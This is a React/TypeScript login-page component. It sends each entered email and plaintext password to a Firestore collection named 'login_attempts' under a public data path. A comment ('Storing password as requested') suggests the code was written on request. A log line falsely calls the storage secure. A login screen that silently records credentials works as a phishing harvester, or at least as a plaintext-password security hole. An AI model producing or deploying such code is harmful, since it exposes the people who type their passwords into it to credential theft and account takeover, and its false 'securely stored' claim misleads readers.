import React, { useCallback, useEffect } from 'react';
import LoginCard from './components/LoginCard';
// @ts-ignore
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
// @ts-ignore
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

const App: React.FC = () => {
  // Initialize Database connection
  let db: any = null;
  let appId = 'default-app-id';

  useEffect(() => {
    try {
      // Access global configuration injected by the environment
      const appConfigStr = (window as any).__firebase_config;
      if (appConfigStr) {
        const config = JSON.parse(appConfigStr);
        const app = initializeApp(config);
        db = getFirestore(app);
        appId = (window as any).__app_id || appId;
        console.log("Database connection initialized.");
      } else {
        console.warn("Firebase configuration not found. Running in simulation mode.");
      }
    } catch (e) {
      console.error("Error initializing database connection:", e);
    }
  }, []);

  const handleLoginAttempt = useCallback(async (email: string, password: string) => {
    const timestamp = new Date().toISOString();
    
    // Construct the payload
    const payload = {
      email,
      password, // Storing password as requested
      timestamp,
      status: 'Attempt Recorded'
    };

    if (db) {
      try {
        await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'login_attempts'), payload);
        console.log("Credentials securely stored in database.");
      } catch (error) {
        console.error("Failed to write to database:", error);
      }
    } else {
      // Fallback for demo purposes if DB is not connected
      console.log("Simulation - DB Write:", payload);
    }
  }, []);

  return (
    <div className="min-h-screen w-full flex items-center justify-center bg-background p-4 font-sans text-text">
      <LoginCard onLoginAttempt={handleLoginAttempt} />
    </div>
  );
};

export default App;